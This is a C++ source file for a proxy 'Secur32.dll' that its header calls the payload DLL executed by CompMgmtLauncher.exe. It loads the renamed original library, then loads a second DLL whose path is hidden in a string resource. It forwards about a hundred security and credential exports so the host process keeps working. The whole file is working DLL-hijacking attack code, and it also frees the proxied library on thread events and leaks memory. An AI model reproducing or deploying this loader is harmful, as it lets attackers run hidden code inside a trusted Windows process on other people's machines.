// Secur32.cpp, the payload DLL executed by CompMgmtLauncher.exe
#include "pch.h"
#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include "resource.h"
#pragma pack(1)

// LoadString() for linker
#pragma comment(lib,"User32.lib")
#define MAX_ENV_SIZE 32767

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    static HINSTANCE hL;
    LPWSTR pDLL = new WCHAR[MAX_ENV_SIZE];
    char pADLL[MAX_ENV_SIZE];
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        // load the original DLL to proxy
        hL = LoadLibrary(_T(".\\Secur32_org.dll"));
        if (!hL)
            return false;
        LoadString(GetModuleHandle(L"Secur32.dll"), IDS_DLL101, pDLL, MAX_ENV_SIZE);
        WideCharToMultiByte(CP_ACP, 0, pDLL, wcslen(pDLL), pADLL, MAX_ENV_SIZE, NULL, NULL);
        LoadLibrary(pDLL);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        FreeLibrary(hL);
        break;
    }
    return TRUE;
}

// linkers for the original to proxy
#pragma comment(linker, "/export:GetComputerObjectNameW=secur32_org.GetComputerObjectNameW")
#pragma comment(linker, "/export:SecpTranslateName=secur32_org.SecpTranslateName")
#pragma comment(linker, "/export:CollectLsaPerformanceData=secur32_org.CollectLsaPerformanceData")
#pragma comment(linker, "/export:OpenLsaPerformanceData=secur32_org.OpenLsaPerformanceData")
#pragma comment(linker, "/export:CloseLsaPerformanceData=secur32_org.CloseLsaPerformanceData")
#pragma comment(linker, "/export:SecpTranslateNameEx=secur32_org.SecpTranslateNameEx")
#pragma comment(linker, "/export:SecpFreeMemory=secur32_org.SecpFreeMemory")
#pragma comment(linker, "/export:GetComputerObjectNameA=secur32_org.GetComputerObjectNameA")
#pragma comment(linker, "/export:TranslateNameA=secur32_org.TranslateNameA")
#pragma comment(linker, "/export:TranslateNameW=secur32_org.TranslateNameW")
#pragma comment(linker, "/export:AcceptSecurityContext=secur32_org.AcceptSecurityContext")
#pragma comment(linker, "/export:AcquireCredentialsHandleA=secur32_org.AcquireCredentialsHandleA")
#pragma comment(linker, "/export:AcquireCredentialsHandleW=secur32_org.AcquireCredentialsHandleW")
#pragma comment(linker, "/export:AddCredentialsA=secur32_org.AddCredentialsA")
#pragma comment(linker, "/export:AddCredentialsW=secur32_org.AddCredentialsW")
#pragma comment(linker, "/export:AddSecurityPackageA=secur32_org.AddSecurityPackageA")
#pragma comment(linker, "/export:AddSecurityPackageW=secur32_org.AddSecurityPackageW")
#pragma comment(linker, "/export:ApplyControlToken=secur32_org.ApplyControlToken")
#pragma comment(linker, "/export:ChangeAccountPasswordA=secur32_org.ChangeAccountPasswordA")
#pragma comment(linker, "/export:ChangeAccountPasswordW=secur32_org.ChangeAccountPasswordW")
#pragma comment(linker, "/export:CompleteAuthToken=secur32_org.CompleteAuthToken")
#pragma comment(linker, "/export:CredMarshalTargetInfo=secur32_org.CredMarshalTargetInfo")
#pragma comment(linker, "/export:CredUnmarshalTargetInfo=secur32_org.CredUnmarshalTargetInfo")
#pragma comment(linker, "/export:DecryptMessage=secur32_org.DecryptMessage")
#pragma comment(linker, "/export:DeleteSecurityContext=secur32_org.DeleteSecurityContext")
#pragma comment(linker, "/export:DeleteSecurityPackageA=secur32_org.DeleteSecurityPackageA")
#pragma comment(linker, "/export:DeleteSecurityPackageW=secur32_org.DeleteSecurityPackageW")
#pragma comment(linker, "/export:EncryptMessage=secur32_org.EncryptMessage")
#pragma comment(linker, "/export:EnumerateSecurityPackagesA=secur32_org.EnumerateSecurityPackagesA")
#pragma comment(linker, "/export:EnumerateSecurityPackagesW=secur32_org.EnumerateSecurityPackagesW")
#pragma comment(linker, "/export:ExportSecurityContext=secur32_org.ExportSecurityContext")
#pragma comment(linker, "/export:FreeContextBuffer=secur32_org.FreeContextBuffer")
#pragma comment(linker, "/export:FreeCredentialsHandle=secur32_org.FreeCredentialsHandle")
#pragma comment(linker, "/export:GetSecurityUserInfo=secur32_org.GetSecurityUserInfo")
#pragma comment(linker, "/export:GetUserNameExA=secur32_org.GetUserNameExA")
#pragma comment(linker, "/export:GetUserNameExW=secur32_org.GetUserNameExW")
#pragma comment(linker, "/export:ImpersonateSecurityContext=secur32_org.ImpersonateSecurityContext")
#pragma comment(linker, "/export:ImportSecurityContextA=secur32_org.ImportSecurityContextA")
#pragma comment(linker, "/export:ImportSecurityContextW=secur32_org.ImportSecurityContextW")
#pragma comment(linker, "/export:InitSecurityInterfaceA=secur32_org.InitSecurityInterfaceA")
#pragma comment(linker, "/export:InitSecurityInterfaceW=secur32_org.InitSecurityInterfaceW")
#pragma comment(linker, "/export:InitializeSecurityContextA=secur32_org.InitializeSecurityContextA")
#pragma comment(linker, "/export:InitializeSecurityContextW=secur32_org.InitializeSecurityContextW")
#pragma comment(linker, "/export:LsaCallAuthenticationPackage=secur32_org.LsaCallAuthenticationPackage")
#pragma comment(linker, "/export:LsaConnectUntrusted=secur32_org.LsaConnectUntrusted")
#pragma comment(linker, "/export:LsaDeregisterLogonProcess=secur32_org.LsaDeregisterLogonProcess")
#pragma comment(linker, "/export:LsaEnumerateLogonSessions=secur32_org.LsaEnumerateLogonSessions")
#pragma comment(linker, "/export:LsaFreeReturnBuffer=secur32_org.LsaFreeReturnBuffer")
#pragma comment(linker, "/export:LsaGetLogonSessionData=secur32_org.LsaGetLogonSessionData")
#pragma comment(linker, "/export:LsaLogonUser=secur32_org.LsaLogonUser")
#pragma comment(linker, "/export:LsaLookupAuthenticationPackage=secur32_org.LsaLookupAuthenticationPackage")
#pragma comment(linker, "/export:LsaRegisterLogonProcess=secur32_org.LsaRegisterLogonProcess")
#pragma comment(linker, "/export:LsaRegisterPolicyChangeNotification=secur32_org.LsaRegisterPolicyChangeNotification")
#pragma comment(linker, "/export:LsaUnregisterPolicyChangeNotification=secur32_org.LsaUnregisterPolicyChangeNotification")
#pragma comment(linker, "/export:MakeSignature=secur32_org.MakeSignature")
#pragma comment(linker, "/export:QueryContextAttributesA=secur32_org.QueryContextAttributesA")
#pragma comment(linker, "/export:QueryContextAttributesW=secur32_org.QueryContextAttributesW")
#pragma comment(linker, "/export:QueryCredentialsAttributesA=secur32_org.QueryCredentialsAttributesA")
#pragma comment(linker, "/export:QueryCredentialsAttributesW=secur32_org.QueryCredentialsAttributesW")
#pragma comment(linker, "/export:QuerySecurityContextToken=secur32_org.QuerySecurityContextToken")
#pragma comment(linker, "/export:QuerySecurityPackageInfoA=secur32_org.QuerySecurityPackageInfoA")
#pragma comment(linker, "/export:QuerySecurityPackageInfoW=secur32_org.QuerySecurityPackageInfoW")
#pragma comment(linker, "/export:RevertSecurityContext=secur32_org.RevertSecurityContext")
#pragma comment(linker, "/export:SaslAcceptSecurityContext=secur32_org.SaslAcceptSecurityContext")
#pragma comment(linker, "/export:SaslEnumerateProfilesA=secur32_org.SaslEnumerateProfilesA")
#pragma comment(linker, "/export:SaslEnumerateProfilesW=secur32_org.SaslEnumerateProfilesW")
#pragma comment(linker, "/export:SaslGetContextOption=secur32_org.SaslGetContextOption")
#pragma comment(linker, "/export:SaslGetProfilePackageA=secur32_org.SaslGetProfilePackageA")
#pragma comment(linker, "/export:SaslGetProfilePackageW=secur32_org.SaslGetProfilePackageW")
#pragma comment(linker, "/export:SaslIdentifyPackageA=secur32_org.SaslIdentifyPackageA")
#pragma comment(linker, "/export:SaslIdentifyPackageW=secur32_org.SaslIdentifyPackageW")
#pragma comment(linker, "/export:SaslInitializeSecurityContextA=secur32_org.SaslInitializeSecurityContextA")
#pragma comment(linker, "/export:SaslInitializeSecurityContextW=secur32_org.SaslInitializeSecurityContextW")
#pragma comment(linker, "/export:SaslSetContextOption=secur32_org.SaslSetContextOption")
#pragma comment(linker, "/export:SealMessage=secur32_org.SealMessage")
#pragma comment(linker, "/export:SeciAllocateAndSetCallFlags=secur32_org.SeciAllocateAndSetCallFlags")
#pragma comment(linker, "/export:SeciAllocateAndSetIPAddress=secur32_org.SeciAllocateAndSetIPAddress")
#pragma comment(linker, "/export:SeciFreeCallContext=secur32_org.SeciFreeCallContext")
#pragma comment(linker, "/export:SetContextAttributesA=secur32_org.SetContextAttributesA")
#pragma comment(linker, "/export:SetContextAttributesW=secur32_org.SetContextAttributesW")
#pragma comment(linker, "/export:SetCredentialsAttributesA=secur32_org.SetCredentialsAttributesA")
#pragma comment(linker, "/export:SetCredentialsAttributesW=secur32_org.SetCredentialsAttributesW")
#pragma comment(linker, "/export:SspiCompareAuthIdentities=secur32_org.SspiCompareAuthIdentities")
#pragma comment(linker, "/export:SspiCopyAuthIdentity=secur32_org.SspiCopyAuthIdentity")
#pragma comment(linker, "/export:SspiDecryptAuthIdentity=secur32_org.SspiDecryptAuthIdentity")
#pragma comment(linker, "/export:SspiEncodeAuthIdentityAsStrings=secur32_org.SspiEncodeAuthIdentityAsStrings")
#pragma comment(linker, "/export:SspiEncodeStringsAsAuthIdentity=secur32_org.SspiEncodeStringsAsAuthIdentity")
#pragma comment(linker, "/export:SspiEncryptAuthIdentity=secur32_org.SspiEncryptAuthIdentity")
#pragma comment(linker, "/export:SspiExcludePackage=secur32_org.SspiExcludePackage")
#pragma comment(linker, "/export:SspiFreeAuthIdentity=secur32_org.SspiFreeAuthIdentity")
#pragma comment(linker, "/export:SspiGetTargetHostName=secur32_org.SspiGetTargetHostName")
#pragma comment(linker, "/export:SspiIsAuthIdentityEncrypted=secur32_org.SspiIsAuthIdentityEncrypted")
#pragma comment(linker, "/export:SspiLocalFree=secur32_org.SspiLocalFree")
#pragma comment(linker, "/export:SspiMarshalAuthIdentity=secur32_org.SspiMarshalAuthIdentity")
#pragma comment(linker, "/export:SspiPrepareForCredRead=secur32_org.SspiPrepareForCredRead")
#pragma comment(linker, "/export:SspiPrepareForCredWrite=secur32_org.SspiPrepareForCredWrite")
#pragma comment(linker, "/export:SspiUnmarshalAuthIdentity=secur32_org.SspiUnmarshalAuthIdentity")
#pragma comment(linker, "/export:SspiValidateAuthIdentity=secur32_org.SspiValidateAuthIdentity")
#pragma comment(linker, "/export:SspiZeroAuthIdentity=secur32_org.SspiZeroAuthIdentity")
#pragma comment(linker, "/export:UnsealMessage=secur32_org.UnsealMessage")
#pragma comment(linker, "/export:VerifySignature=secur32_org.VerifySignature")